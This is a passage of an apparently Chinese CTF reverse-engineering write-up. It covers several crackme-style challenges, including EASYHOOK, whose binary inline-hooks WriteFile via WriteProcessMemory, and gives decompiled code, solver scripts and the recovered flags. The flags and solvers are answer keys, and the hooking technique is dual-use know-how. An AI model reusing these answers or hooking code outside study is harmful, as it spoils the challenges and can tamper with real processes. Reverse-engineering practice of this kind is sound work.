*v2; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v5[<span class="hljs-number">26</span>]; <span class="hljs-comment">// [esp+4Ch] [ebp-74h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+B4h] [ebp-Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *Str; <span class="hljs-comment">// [esp+B8h] [ebp-8h]</span></span><br><span class="line">  CWnd *v8; <span class="hljs-comment">// [esp+BCh] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="hljs-keyword">this</span>;</span><br><span class="line">  v1 = (CWnd *)((<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span> + <span class="hljs-number">100</span>);</span><br><span class="line">  v2 = CWnd::<span class="hljs-built_in">GetDlgItem</span>(<span class="hljs-keyword">this</span>, <span class="hljs-number">1002</span>);</span><br><span class="line">  CWnd::<span class="hljs-built_in">GetWindowTextA</span>(v2, v1);</span><br><span class="line">  v3 = <span class="hljs-built_in">sub_401A30</span>((<span class="hljs-keyword">char</span> *)v8 + <span class="hljs-number">100</span>);</span><br><span class="line">  Str = CString::<span class="hljs-built_in">GetBuffer</span>((CWnd *)((<span class="hljs-keyword">char</span> *)v8 + <span class="hljs-number">100</span>), v3);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strlen</span>(Str) )</span><br><span class="line">    <span class="hljs-keyword">return</span> CWnd::<span class="hljs-built_in">MessageBoxA</span>(v8, &amp;Qingshuru, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; Str[i]; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( Str[i] &gt; <span class="hljs-number">57</span> || Str[i] &lt; <span class="hljs-number">48</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( Str[i] &gt; <span class="hljs-number">122</span> || Str[i] &lt; <span class="hljs-number">97</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">if</span> ( Str[i] &gt; <span class="hljs-number">90</span> || Str[i] &lt; <span class="hljs-number">65</span> )</span><br><span class="line">          <span class="hljs-built_in">fail</span>();</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">          v5[i] = Str[i] - <span class="hljs-number">29</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        v5[i] = Str[i] - <span class="hljs-number">87</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v5[i] = Str[i] - <span class="hljs-number">48</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_4017F0</span>((<span class="hljs-keyword">int</span>)v5);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个函数也很简单，把输入的内容赋给<code>Str</code>，然后对str里面的字符进行一个变换，把变换后的数组传给刚刚分析的那个函数，所以想要逆向解出输入的字符就很简单了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="hljs-string">'KanXueCTF2019JustForhappy'</span></span><br><span class="line">alphabet = <span class="hljs-string">'abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ'</span></span><br><span class="line">a1 = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str1:</span><br><span class="line">    j = alphabet.index(i)</span><br><span class="line">    a1.append(j)</span><br><span class="line"><span class="hljs-comment"># print(a1)</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a1:</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= i &lt;= <span class="hljs-number">9</span>:</span><br><span class="line">        flag += <span class="hljs-built_in">chr</span>(i + <span class="hljs-number">48</span>)</span><br><span class="line">    <span class="hljs-keyword">elif</span> i &lt;= <span class="hljs-number">35</span>:</span><br><span class="line">        flag += <span class="hljs-built_in">chr</span>(i + <span class="hljs-number">87</span>)</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        flag += <span class="hljs-built_in">chr</span>(i + <span class="hljs-number">29</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>根据题目要求把输出的内容套上flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{j<span class="hljs-number">0</span>rXI<span class="hljs-number">4</span>bTeustBiIGHeCF<span class="hljs-number">70</span>DDM}</span><br></pre></td></tr></tbody></table></figure><h4 id="easyRE1"><a href="#easyRE1" class="headerlink" title="easyRE1"></a>easyRE1</h4><p>毫无意义的题目，打开就能看到flag，套上<code>flag{}</code>直接交上去就行了</p><h4 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h4><p>题如其名，peid打开发现是c#，所以直接dnspy打开，发现flag是直接计算出来的，并且没有进行任何的反调试，所以直接调试运行几步就得到了flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{<span class="hljs-number">967</span>DDDFBCD<span class="hljs-number">32</span>C<span class="hljs-number">1</span>F<span class="hljs-number">53527</span>C<span class="hljs-number">221</span>D<span class="hljs-number">9</span>E<span class="hljs-number">40</span>A<span class="hljs-number">0</span>B}</span><br></pre></td></tr></tbody></table></figure><h4 id="Guess-the-Number"><a href="#Guess-the-Number" class="headerlink" title="Guess-the-Number"></a>Guess-the-Number</h4><p>这题是java逆向，cfr反编译之后，查看源代码</p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">guess</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">static</span> String <span class="hljs-title">XOR</span><span class="hljs-params">(String _str_one, String _str_two)</span> </span>{</span><br><span class="line">        BigInteger i1 = <span class="hljs-keyword">new</span> BigInteger(_str_one, <span class="hljs-number">16</span>);</span><br><span class="line">        BigInteger i2 = <span class="hljs-keyword">new</span> BigInteger(_str_two, <span class="hljs-number">16</span>);</span><br><span class="line">        BigInteger res = i1.xor(i2);</span><br><span class="line">        String result = res.toString(<span class="hljs-number">16</span>);</span><br><span class="line">        <span class="hljs-keyword">return</span> result;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        block5: {</span><br><span class="line">            <span class="hljs-keyword">int</span> guess_number = <span class="hljs-number">0</span>;</span><br><span class="line">            <span class="hljs-keyword">int</span> my_num = <span class="hljs-number">349763335</span>;</span><br><span class="line">            <span class="hljs-keyword">int</span> my_number = <span class="hljs-number">1545686892</span>;</span><br><span class="line">            <span class="hljs-keyword">int</span> flag = <span class="hljs-number">345736730</span>;</span><br><span class="line">            <span class="hljs-keyword">if</span> (args.length &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">                <span class="hljs-keyword">try</span> {</span><br><span class="line">                    guess_number = Integer.parseInt(args[<span class="hljs-number">0</span>]);</span><br><span class="line">                    <span class="hljs-keyword">if</span> (my_number / <span class="hljs-number">5</span> == guess_number) {</span><br><span class="line">                        String str_one = <span class="hljs-string">"4b64ca12ace755516c178f72d05d7061"</span>;</span><br><span class="line">                        String str_two = <span class="hljs-string">"ecd44646cfe5994ebeb35bf922e25dba"</span>;</span><br><span class="line">                        my_num += flag;</span><br><span class="line">                        String answer = guess.XOR(str_one, str_two);</span><br><span class="line">                        System.out.println(<span class="hljs-string">"your flag is: "</span> + answer);</span><br><span class="line">                        <span class="hljs-keyword">break</span> block5;</span><br><span class="line">                    }</span><br><span class="line">                    System.err.println(<span class="hljs-string">"wrong guess!"</span>);</span><br><span class="line">                    System.exit(<span class="hljs-number">1</span>);</span><br><span class="line">                }</span><br><span class="line">                <span class="hljs-keyword">catch</span> (NumberFormatException e) {</span><br><span class="line">                    System.err.println(<span class="hljs-string">"please enter an integer \nexample: java -jar guess 12"</span>);</span><br><span class="line">                    System.exit(<span class="hljs-number">1</span>);</span><br><span class="line">                }</span><br><span class="line">            } <span class="hljs-keyword">else</span> {</span><br><span class="line">                System.err.println(<span class="hljs-string">"wrong guess!"</span>);</span><br><span class="line">                <span class="hljs-keyword">int</span> num = <span class="hljs-number">1000000</span>;</span><br><span class="line">                ++num;</span><br><span class="line">                System.exit(<span class="hljs-number">1</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>程序很简单，我们当然可以根据算法来算出来flag的值，但是完全可以得到需要输入的数，所以直接运行就好了</p><figure class="highlight powershell hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;java <span class="hljs-literal">-jar</span> Guess<span class="hljs-literal">-the</span><span class="hljs-literal">-Number</span>.jar <span class="hljs-number">309137378</span></span><br></pre></td></tr></tbody></table></figure><p>输出结果</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">your</span> flag is: a<span class="hljs-number">7</span>b<span class="hljs-number">08</span>c<span class="hljs-number">546302</span>cc<span class="hljs-number">1</span>fd<span class="hljs-number">2</span>a<span class="hljs-number">4</span>d<span class="hljs-number">48</span>bf<span class="hljs-number">2</span>bf<span class="hljs-number">2</span>ddb</span><br></pre></td></tr></tbody></table></figure><p>直接提交即可</p><h4 id="EASYHOOK"><a href="#EASYHOOK" class="headerlink" title="EASYHOOK"></a>EASYHOOK</h4><p>这题很有意思，值得好好分析一下，IDA打开，找到main函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span></span><br><span class="line">  HANDLE v4; <span class="hljs-comment">// eax</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="hljs-comment">// [esp+4h] [ebp-24h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> Buffer; <span class="hljs-comment">// [esp+8h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">puts</span>((<span class="hljs-keyword">int</span>)aPleaseInputFla);</span><br><span class="line">  <span class="hljs-built_in">scanf</span>(a31s, &amp;Buffer);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(&amp;Buffer) == <span class="hljs-number">19</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">sub_401220</span>();</span><br><span class="line">    v4 = <span class="hljs-built_in">CreateFileA</span>(FileName, <span class="hljs-number">0x40000000</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2u</span>, <span class="hljs-number">0x80</span>u, <span class="hljs-number">0</span>);</span><br><span class="line">    <span class="hljs-built_in">WriteFile</span>(v4, &amp;Buffer, <span class="hljs-number">19u</span>, &amp;NumberOfBytesWritten, <span class="hljs-number">0</span>);</span><br><span class="line">    <span class="hljs-built_in">sub_401240</span>(&amp;Buffer, &amp;NumberOfBytesWritten);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( NumberOfBytesWritten == <span class="hljs-number">1</span> )</span><br><span class="line">      <span class="hljs-built_in">puts</span>((<span class="hljs-keyword">int</span>)aRightFlagIsYou);</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">      <span class="hljs-built_in">puts</span>((<span class="hljs-keyword">int</span>)aWrong);</span><br><span class="line">    <span class="hljs-built_in">system</span>(aPause);</span><br><span class="line">    result = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">puts</span>((<span class="hljs-keyword">int</span>)aWrong);</span><br><span class="line">    <span class="hljs-built_in">system</span>(aPause);</span><br><span class="line">    result = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>第一反应当然是查看一下<code>sub_401240()</code>的内容，毕竟这是最后一个调用<code>NumberOfBytesWritten</code>的函数，而这个值，经过<code>writeFile()</code>之后应该是19</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">sub_401240</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1, _DWORD *a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// kr04_4</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">strcpy</span>(v4, <span class="hljs-string">"This_is_not_the_flag"</span>);</span><br><span class="line">  v3 = <span class="hljs-built_in">strlen</span>(a1) + <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)(v3 - <span class="hljs-number">1</span>) &gt; <span class="hljs-number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v4[a1 - v4 + result] == v4[result] )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( ++result &gt;= (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)(v3 - <span class="hljs-number">1</span>) )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">if</span> ( result == <span class="hljs-number">21</span> )</span><br><span class="line">        {</span><br><span class="line">          result = (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)a2;</span><br><span class="line">          *a2 = <span class="hljs-number">1</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> result;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>看到<code>This_is_not_the_flag</code>感觉有些不对，仔细观察发现这个字符串有20的字符，而下面的判断需要我们的输入和这个字符串相等，但是我们只输入19个字符，所以这个函数永远不可能返回我们想要的结果，肯定是有什么东西被漏掉了，所以返回<code>main</code>，前面还有一个<code>sub_401220()</code>没有看</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_401220</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  HMODULE v0; <span class="hljs-comment">// eax</span></span><br><span class="line">  DWORD v2; <span class="hljs-comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="hljs-built_in">GetCurrentProcessId</span>();</span><br><span class="line">  hProcess = <span class="hljs-built_in">OpenProcess</span>(<span class="hljs-number">0x1F0FFF</span>u, <span class="hljs-number">0</span>, v2);</span><br><span class="line">  v0 = <span class="hljs-built_in">LoadLibraryA</span>(LibFileName);</span><br><span class="line">  dword_40C9C4 = (<span class="hljs-keyword">int</span>)<span class="hljs-built_in">GetProcAddress</span>(v0, unk_40A05C);<span class="hljs-comment">// 找到writefile的地址</span></span><br><span class="line">  lpAddress = (LPVOID)dword_40C9C4;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !dword_40C9C4 )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>((<span class="hljs-keyword">int</span>)&amp;dword_40A044);</span><br><span class="line">  unk_40C9B4 = *(_DWORD *)lpAddress;</span><br><span class="line">  *((_BYTE *)&amp;unk_40C9B4 + <span class="hljs-number">4</span>) = *((_BYTE *)lpAddress + <span class="hljs-number">4</span>);</span><br><span class="line">  byte_40C9BC = <span class="hljs-number">0xE9</span>u;</span><br><span class="line">  dword_40C9BD = (<span class="hljs-keyword">char</span> *)sub_401080 - (<span class="hljs-keyword">char</span> *)lpAddress - <span class="hljs-number">5</span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_4010D0</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在这里发现了问题，这里找到了储存<code>writefile()</code>地址的位置，然后保存前五个字节的内容，后面进行了一些赋值，看到<code>0xE9</code>就发现这里想要修改<code>writefile()</code>函数地址，跳转到另一个函数<code>sub_401080()</code>，然后函数进入<code>sub_4010D0()</code></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">BOOL <span class="hljs-title">sub_4010D0</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  DWORD v1; <span class="hljs-comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  DWORD flOldProtect; <span class="hljs-comment">// [esp+8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">VirtualProtectEx</span>(hProcess, lpAddress, <span class="hljs-number">5u</span>, <span class="hljs-number">4u</span>, &amp;flOldProtect);</span><br><span class="line">  <span class="hljs-built_in">WriteProcessMemory</span>(hProcess, lpAddress, &amp;byte_40C9BC, <span class="hljs-number">5u</span>, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">VirtualProtectEx</span>(hProcess, lpAddress, <span class="hljs-number">5u</span>, flOldProtect, &amp;v1);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个函数把刚刚的修改写进了相应的地址，此时程序一旦调用<code>writefile()</code>，就会跳转到<code>sub_401080()</code>，所以转到这个函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall <span class="hljs-title">sub_401080</span><span class="hljs-params">(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="hljs-built_in">sub_401000</span>((<span class="hljs-keyword">int</span>)lpBuffer, nNumberOfBytesToWrite);</span><br><span class="line">  <span class="hljs-built_in">sub_401140</span>();</span><br><span class="line">  <span class="hljs-built_in">WriteFile</span>(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v5 )</span><br><span class="line">    *lpNumberOfBytesWritten = <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果<code>sub_401000()</code>返回值是1，就会输出我们的输入是正确的，<code>sub_401140()</code>是用来恢复<code>writefile()</code>函数的地址，就不再赘述，所以重点就是<code>sub_401000()</code></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">sub_401000</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// al</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// bl</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// cl</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( a2 &gt; <span class="hljs-number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">18</span> )</span><br><span class="line">      {</span><br><span class="line">        *(_BYTE *)(a1 + <span class="hljs-number">18</span>) ^= <span class="hljs-number">0x13</span>u;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v2 % <span class="hljs-number">2</span> )</span><br><span class="line">          v3 = *(_BYTE *)(v2 + a1) - v2;</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">          v3 = *(_BYTE *)(v2 + a1 + <span class="hljs-number">2</span>);</span><br><span class="line">        *(_BYTE *)(v2 + a1) = v2 ^ v3;</span><br><span class="line">      }</span><br><span class="line">      ++v2;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v2 &lt; a2 );</span><br><span class="line">  }</span><br><span class="line">  v4 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( a2 &lt;= <span class="hljs-number">0</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">  v5 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( aAjygkfmSv8mln[v5] == *(_BYTE *)(v5 + a1) )</span><br><span class="line">  {</span><br><span class="line">    v5 = ++v4;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v4 &gt;= a2 )</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里的操作就很简单了，也不需要再多说，我们的输入经过处理后如果和内存中的字符串相同，就对了</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">char</span> str[<span class="hljs-number">20</span>] =</span><br><span class="line">            <span class="hljs-string">"ajygkFm.\x7F_~-SV{8mLn"</span>;</span><br><span class="line">    <span class="hljs-keyword">char</span> a1[<span class="hljs-number">20</span>] = {<span class="hljs-number">0</span>};</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">19</span>; i++) {</span><br><span class="line">        <span 